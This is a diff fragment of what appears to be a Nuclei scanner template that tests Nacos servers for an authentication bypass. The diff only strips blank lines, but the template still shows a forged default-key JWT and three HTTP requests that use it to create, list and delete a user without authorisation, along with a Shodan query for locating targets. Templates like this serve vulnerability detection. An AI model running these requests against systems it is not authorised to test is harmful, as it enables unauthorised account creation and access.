@@ -17,7 +17,6 @@ info:
     product: nacos
     shodan-query: title:"Nacos"
   tags: misconfig,nacos,unauth,bypass,instrusive
-
 variables:
   token: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
 
@@ -26,11 +25,9 @@ http:
       - |
         POST /nacos/v1/auth/users/?username={{randstr_1}}&password={{randstr_2}}&accessToken={{token}} HTTP/1.1
         Host: {{Hostname}}
-
       - |
         GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken={{token}} HTTP/1.1
         Host: {{Hostname}}
-
       - |
         DELETE /nacos/v1/auth/users/?username={{randstr_1}}&accessToken={{token}} HTTP/1.1
         Host: {{Hostname}}
